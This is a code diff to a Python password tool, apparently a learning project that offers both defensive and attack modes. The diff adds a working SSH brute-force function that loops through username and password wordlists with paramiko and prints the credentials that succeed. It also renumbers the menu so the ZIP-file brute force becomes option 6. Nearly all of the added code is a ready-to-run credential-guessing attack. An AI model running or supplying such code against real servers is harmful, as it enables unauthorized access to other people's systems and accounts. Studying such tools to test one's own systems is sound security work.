@@ -48,6 +48,29 @@ def ssh_brute_force(ip, username, wordlist_path):
                 print(f"Error: {e}")
     print("Brute force attack failed. No valid password found.")
 
+def ssh_brute_force_with_userlist(ip, userlist_path, wordlist_path):
+    with open(userlist_path, 'r', encoding='latin-1') as users_file:
+        usernames = users_file.read().splitlines()
+
+    with open(wordlist_path, 'r', encoding='latin-1') as passwords_file:
+        passwords = passwords_file.read().splitlines()
+
+    for username in usernames:
+        for password in passwords:
+            password = password.strip()
+            try:
+                ssh = paramiko.SSHClient()
+                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+                ssh.connect(ip, username=username, password=password)
+                print(f"Successful login: {username}:{password}")
+                ssh.close()
+                return
+            except paramiko.AuthenticationException:
+                print(f"Failed login: {username}:{password}")
+            except Exception as e:
+                print(f"Error: {e}")
+    print("Brute force attack failed. No valid username and password combination found.")
+
 def zip_brute_force(zip_path, wordlist_path):
     with zipfile.ZipFile(zip_path, 'r') as zip_ref:
         with open(wordlist_path, 'r', encoding='latin-1') as file:
@@ -67,7 +90,8 @@ def main():
     print("2: Defensive; Password Recognized")
     print("3: Defensive; Password Complexity")
     print("4: SSH Brute Force Attack")
-    print("5: ZIP File Brute Force Attack")
+    print("5: SSH Brute Force Attack with User List")
+    print("6: ZIP File Brute Force Attack")
     mode = int(input("Enter mode: "))
 
     if mode == 1:
@@ -86,6 +110,11 @@ def main():
         wordlist_path = input("Enter word list file path: ")
         ssh_brute_force(ip, username, wordlist_path)
     elif mode == 5:
+        ip = input("Enter SSH server IP address: ")
+        userlist_path = input("Enter user list file path: ")
+        wordlist_path = input("Enter word list file path: ")
+        ssh_brute_force_with_userlist(ip, userlist_path, wordlist_path)
+    elif mode == 6:
         zip_path = input("Enter path to ZIP file: ")
         wordlist_path = input("Enter word list file path: ")
         zip_brute_force(zip_path, wordlist_path)
